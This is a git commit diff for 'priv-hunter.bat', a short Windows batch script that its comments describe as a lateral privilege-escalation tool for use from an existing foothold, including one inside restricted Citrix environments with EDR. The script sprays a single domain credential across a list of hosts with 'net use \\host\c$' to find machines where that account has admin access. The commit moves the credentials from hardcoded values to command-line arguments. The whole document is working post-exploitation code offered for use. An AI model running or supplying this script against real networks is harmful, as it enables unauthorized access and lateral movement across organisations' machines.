acdcea2847b78be950020e2bd3a56c814318506e
jamesonhacking <40134554+jamesonhacking@users.noreply.github.com>
2021-04-29 02:35:25 -0500

    Add ability for arguments to be passed

--- priv-hunter.bat
+++ priv-hunter.bat
@@ -1,4 +1,15 @@
-REM This simple batch script is designed for using an existing Windows foothold (with or without existing admin privileges) to search for other targets where admin access exists.
-REM Improvements are on the way, but for now you'll have to hardcode the domain, username, and password.
-set /p inputfile="Please specify an input file which has each IP address or DNS name on a separate line: "
-for /F "tokens=*" %%A in (%inputfile%) do net use \\%%A\c$ /user:domain\username Password123 & net use
+echo off
+REM priv-hunter v1.0.1 -- by @james1052
+REM This is a tool for lateral privilege escalation when in a very limited environment like Citrix with EDR and no local admin privileges.
+REM The tool sprays one set of credentials across a list of targets, in search of local admin privileges on a remote target.
+REM Compromised hosts will be displayed in the real time output with \c$ appended.
+REM
+REM Syntax: priv-hunter.bat <input-file> <domain> <username> <password>
+REM
+REM The <input-file> should be a text file with hostnames or IP addresses, each on a separate line.
+set inputfile=%1
+set domain=%2
+set username=%3
+set password=%4
+echo on
+for /F "tokens=*" %%A in (%inputfile%) do net use \\%%A\c$ /user:%domain%\%username% %password% & net use
